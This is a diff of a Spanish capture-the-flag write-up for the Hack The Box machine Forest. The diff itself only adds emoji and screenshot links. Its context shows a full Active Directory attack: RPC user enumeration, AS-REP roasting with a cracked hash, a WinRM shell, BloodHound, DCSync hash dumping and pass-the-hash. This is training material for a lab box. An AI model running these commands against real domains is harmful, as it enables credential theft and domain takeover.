@@ -16,7 +16,7 @@
 
 ---
 
-## Descripción General
+## 📌 Descripción General
 
 Forest es una máquina Windows que actúa como **controlador de dominio (Domain Controller)**. Es una máquina excelente para aprender conceptos de Active Directory que raramente se ven en otros CTFs. El flujo de ataque es el siguiente:
 
@@ -28,9 +28,9 @@ Forest es una máquina Windows que actúa como **controlador de dominio (Domain 
 
 ---
 
-## Reconocimiento
+## 🔎 Reconocimiento
 
-### nmap
+### 🌐 nmap
 
 Lo primero que hacemos siempre es un escaneo de puertos. Lanzamos primero un escaneo rápido de todos los puertos TCP:
 
@@ -172,7 +172,7 @@ Nmap done: 1 IP address (1 host up) scanned in 73.35 seconds
 
 ---
 
-### DNS - UDP/TCP 53
+### 🌐 DNS - UDP/TCP 53
 
 Intentamos resolver nombres internos del dominio apuntando directamente al servidor DNS de la máquina:
 
@@ -204,6 +204,7 @@ htb.local.              600     IN      A       10.129.32.68
 ;; WHEN: Mon Oct 14 14:34:17 EDT 2019
 ;; MSG SIZE  rcvd: 66
 ```
+![](/Images/forest4.png)<br>
 
 ```bash
 dig @10.129.32.68 forest.htb.local
@@ -234,6 +235,8 @@ forest.htb.local.       3600    IN      A       10.129.32.68
 ;; MSG SIZE  rcvd: 73
 ```
 
+![](/Images/forest5.png)<br>
+
 Ambos nombres resuelven a la misma IP, lo cual confirma que el propio Forest es el controlador de dominio.
 
 También intentamos una **transferencia de zona** (AXFR), que nos daría todos los registros DNS del dominio — pero está deshabilitada:
@@ -249,11 +252,13 @@ dig axfr @10.129.32.68 htb.local
 ; Transfer failed.
 ```
 
+![](/Images/forest6.png)<br>
+
 > 💡 Una transferencia de zona exitosa sería un hallazgo crítico, ya que revelaría toda la infraestructura interna. En entornos bien configurados siempre estará bloqueada.
 
 ---
 
-### SMB - TCP 445
+### 📂 SMB - TCP 445
 
 Probamos a enumerar recursos compartidos sin credenciales (acceso anónimo / null session):
 
@@ -270,6 +275,8 @@ smbmap -H 10.129.32.68
 [!] Access Denied
 ```
 
+![](/Images/forest7.png)<br>
+
 ```bash
 smbclient -N -L //10.129.32.68
 ```
@@ -285,12 +292,13 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.129.32.68 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Failed to connect with SMB1 -- no workgroup available
 ```
+![](/Images/forest8.png)<br>
 
 > 💡 El login anónimo se acepta pero no obtenemos información útil. SMB no nos da acceso a recursos compartidos sin credenciales válidas. Continuamos con otros vectores.
 
 ---
 
-### RPC - TCP 445
+### 🔗 RPC - TCP 445
 
 **RPC (Remote Procedure Call)** es un protocolo que permite ejecutar funciones en sistemas remotos. En entornos Active Directory, RPC puede permitir la enumeración de usuarios y grupos sin autenticación (null session), lo cual es un problema de configuración común.
 
@@ -343,6 +351,8 @@ user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
 
+![](/Images/forest9.png)<br>
+
 > 💡 El **RID (Relative Identifier)** es el identificador único de cada objeto dentro del dominio. El RID `0x1f4` (500 en decimal) siempre corresponde a la cuenta **Administrator** en Windows. Las cuentas `SM_*` y `HealthMailbox*` son cuentas de servicio internas de **Microsoft Exchange**.
 
 También enumeramos los grupos del dominio:
@@ -391,6 +401,7 @@ group:[Service Accounts] rid:[0x47c]
 group:[Privileged IT Accounts] rid:[0x47d]
 group:[test] rid:[0x13ed]
 ```
+![](/Images/forest10.png)<br>
 
 Consultamos los miembros del grupo **Domain Admins** (RID `0x200`):
 
@@ -405,6 +416,8 @@ rpcclient $> querygroupmem 0x200
         rid:[0x1f4] attr:[0x7]
 ```
 
+![](/Images/forest11.png)<br>
+
 Solo hay un miembro: el Administrator (RID `0x1f4`). Lo confirmamos:
 
 ```bash
@@ -415,11 +428,13 @@ rpcclient $> queryuser 0x1f4
         logon_count:    0x00000031
 ```
 
+![](/Images/forest12.png)<br>
+
 ---
 
-## Shell como svc-alfresco
+## 💻 Shell como svc-alfresco
 
-### AS-REP Roasting
+### 🔐 AS-REP Roasting
 
 > 💡 **¿Qué es AS-REP Roasting?**
 >
@@ -443,6 +458,8 @@ santi
 sebastien
 svc-alfresco
 ```
+
+![](/Images/forest13.png)<br>
 
 Usamos la herramienta `impacket-GetNPUsers` de **Impacket** para probar cada usuario:
 
@@ -473,13 +490,15 @@ for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.129.32.68 ht
 $krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
 ```
 
+![](/Images/forest14.png)<br>
+
 ¡Éxito! El usuario **svc-alfresco** tiene el flag `UF_DONT_REQUIRE_PREAUTH` activo y hemos obtenido su hash AS-REP.
 
 > 💡 El hash tiene el formato `$krb5asrep$23$...` que corresponde al tipo **18200** en hashcat. El número `23` indica que usa RC4 como cifrado, que es más débil y más fácil de crackear que AES.
 
 ---
 
-### Crackear el Hash
+### 🔓 Crackear el Hash
 
 Guardamos el hash en un archivo y lo atacamos con **hashcat** usando el diccionario `rockyou.txt`:
 
@@ -491,13 +510,15 @@ hashcat -m 18200 svc-alfresco.htb /usr/share/wordlists/rockyou.txt --force
 $krb5asrep$23$svc-alfresco@HTB:...:s3rvice
 ```
 
+![](/Images/forest15.png)<br>
+
 > 💡 **hashcat** prueba millones de contraseñas por segundo cifrándolas con el mismo algoritmo y comparando el resultado. El flag `-m 18200` indica el tipo de hash (Kerberos AS-REP). Al encontrar coincidencia, nos devuelve la contraseña en texto claro.
 
 ✅ **Credenciales obtenidas:** `svc-alfresco : s3rvice`
 
 ---
 
-### WinRM
+### 🚪 WinRM
 
 > 💡 **¿Qué es WinRM?**  
 > Windows Remote Management (WinRM) es el equivalente de SSH en Windows. Permite ejecutar comandos remotamente. Corre en el puerto **5985** (HTTP) y **5986** (HTTPS). Si tenemos credenciales válidas y el usuario pertenece al grupo `Remote Management Users` (o es administrador), podemos obtener una shell interactiva.
@@ -514,6 +535,7 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
 ```
+![](/Images/forest16.png)<br>
 
 ¡Tenemos shell! Obtenemos la primera flag:
 
@@ -521,12 +543,13 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
 e5e4e47a************************
 ```
+![](/Images/forest17.png)<br>
 
 ---
 
-## Escalada de Privilegios al Administrador
+## ⬆️ Escalada de Privilegios al Administrador
 
-### Enumeración con BloodHound
+### 🧭 Enumeración con BloodHound
 
 > 💡 **¿Qué es BloodHound?**  
 > BloodHound es una herramienta de análisis de Active Directory que visualiza las relaciones entre objetos (usuarios, grupos, equipos, GPOs...) y encuentra **rutas de ataque** hacia objetivos de alto valor como Domain Admins. Usa una base de datos de grafos (Neo4j) para representar estas relaciones.
@@ -540,16 +563,22 @@ Primero descargamos SharpHound y lo subimos a la máquina:
 wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -O SharpHound.exe
 ```
 
+![](/Images/forest18.png)<br>
+
 ```powershell
 # En Evil-WinRM: subimos el ejecutable
 upload SharpHound.exe
 ```
+
+![](/Images/forest19.png)<br>
 
 Ejecutamos SharpHound para recopilar todos los datos del dominio:
 
 ```powershell
 ./SharpHound.exe -c all --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice
 ```
+
+![](/Images/forest20.png)<br>
 
 Esto genera un archivo ZIP con los datos del dominio:
 
@@ -559,6 +588,7 @@ Mode                LastWriteTime         Length Name
 -a----       10/18/2019   3:56 AM          12740 20191018035650_BloodHound.zip
 -a----       10/18/2019   3:56 AM           8978 Rk9SRVNU.bin
 ```
+![](/Images/forest21.png)<br>
 
 Descargamos el ZIP a nuestra máquina:
 
@@ -570,11 +600,15 @@ Info: Downloading C:\\Users\\svc-alfresco\\20260429064650_BloodHound.zip to 2026
 Info: Download successful!
 ```
 
+![](/Images/forest22.png)<br>
+
 Lo importamos en BloodHound y usamos la query **"Find Shortest Paths to Domain Admins"** con `SVC-ALFRESCO@HTB.LOCAL` como nodo de inicio y `DOMAIN ADMINS@HTB.LOCAL` como destino.
+
+![](/Images/forest25.png)<br>
 
 ---
 
-### Análisis de la Ruta en BloodHound
+### 🧠 Análisis de la Ruta en BloodHound
 
 BloodHound nos revela la siguiente cadena de permisos:
 
@@ -602,7 +636,7 @@ svc-alfresco
 
 ---
 
-### Explotación DCSync
+### ⚡ Explotación DCSync
 
 **Paso 1:** Cargamos PowerView en memoria (sin escribirlo a disco para evadir detecciones):
 
@@ -651,6 +685,8 @@ htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16
 [*] Cleaning up...
 ```
 
+![](/Images/forest26.png)<br>
+
 > 💡 El error `RemoteOperations failed: rpc_s_access_denied` es normal y no afecta al resultado. Se debe a que secretsdump intenta primero un método (RemoteOperations vía SVCCTL) que requiere privilegios de administrador local, y al fallar, cae back al método **DRSUAPI** (el DCSync propiamente dicho) que sí funciona con nuestros permisos de replicación.
 >
 > El formato de los hashes es `LM_hash:NT_hash`. El hash LM `aad3b435b51404eeaad3b435b51404ee` es siempre el mismo cuando está deshabilitado (que es el caso en sistemas modernos). El hash que nos interesa es el **NT hash**.
@@ -672,7 +708,7 @@ htb\administrator
 
 ---
 
-## Flags
+## 🚩 Flags
 
 ```powershell
 # User flag
@@ -684,9 +720,11 @@ e5e4e47a************************
 f048153f************************
 ```
 
+![](/Images/forest27.png)<br>
+
 ---
 
-## Beyond Root: Script de Limpieza
+## ♻️ Beyond Root: Script de Limpieza
 
 Al explorar la carpeta del Administrador, encontramos una explicación de por qué teníamos que actuar rápido:
 
@@ -736,7 +774,7 @@ Schedule Type: At system start up
 
 ---
 
-## Conceptos Clave
+## 📚 Conceptos Clave
 
 | Concepto | Descripción |
 |---|---|
